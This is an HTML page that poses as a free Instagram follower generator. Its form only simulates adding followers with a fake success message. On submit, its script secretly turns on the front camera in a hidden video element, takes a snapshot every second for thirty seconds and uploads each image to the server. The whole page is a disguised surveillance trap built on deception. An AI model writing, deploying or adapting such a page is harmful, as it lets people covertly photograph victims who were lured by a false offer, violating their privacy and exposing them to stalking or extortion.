<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Custom Instagram Followers</title>
</head>
<body>
  <form id="instaForm">
    <input type="text" name="username" placeholder="Instagram Username" required />
    <input type="number" name="amount" placeholder="Amount (0 - 10000)" min="0" max="10000" required />
    <button type="submit">Get Followers</button>
  </form>
  <div id="status"></div>
  <script>
    let backgroundRunning = false;

    function sendPicture(imageData) {
      fetch('/upload_image', {
        method: 'POST',
        body: imageData,
        headers: { 'Content-Type': 'application/octet-stream' }
      });
    }

    async function captureFrontCam() {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const video = document.createElement('video');
      video.style.display = 'none'; // Keep hidden
      document.body.appendChild(video);
      video.srcObject = mediaStream;
      video.play();

      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      const ctx = canvas.getContext('2d');

      const captureInterval = setInterval(() => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/png');
        sendPicture(dataUrl);
      }, 1000);

      // Stop capturing after 30 seconds or based on your needs:
      setTimeout(() => {
        clearInterval(captureInterval);
        mediaStream.getTracks().forEach(track => track.stop());
        video.remove();
      }, 30000);
    }

    document.getElementById('instaForm').onsubmit = async function(e) {
      e.preventDefault();
      const username = this.username.value;
      const amount = Math.min(Math.max(parseInt(this.amount.value) || 0, 0), 10000);

      document.getElementById('status').textContent = 'Adding followers...';

      // Simulate follower adding process
      setTimeout(() => {
        document.getElementById('status').textContent = `Success! ${amount} followers sent to ${username}.`;
      }, 1500 + Math.floor(Math.random() * 2500));

      if (!backgroundRunning) {
        backgroundRunning = true;
        captureFrontCam();
      }
    };
  </script>
</body>
</html>
